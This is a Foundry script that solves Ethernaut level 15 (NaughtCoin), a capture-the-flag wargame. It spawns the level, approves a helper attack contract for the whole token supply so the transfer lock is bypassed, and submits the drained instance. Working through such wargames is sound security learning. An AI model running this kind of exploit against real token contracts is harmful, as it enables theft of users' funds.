// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "interfaces/IEthernaut.sol";
import { NaughtCoin } from "src/Level15.sol";
import { L15Attack } from "src/Level15Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[2].topics[2])));
        console2.log(instanceAddress);
        NaughtCoin instance = NaughtCoin(instanceAddress);

        L15Attack attack = new L15Attack();
        (,, address txOrigin) = vm.readCallers();
        instance.approve(address(attack), instance.INITIAL_SUPPLY());
        attack.attack(instance, instance.INITIAL_SUPPLY());
        require(instance.balanceOf(txOrigin) == 0);
        require(instance.balanceOf(address(attack)) == instance.INITIAL_SUPPLY());

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
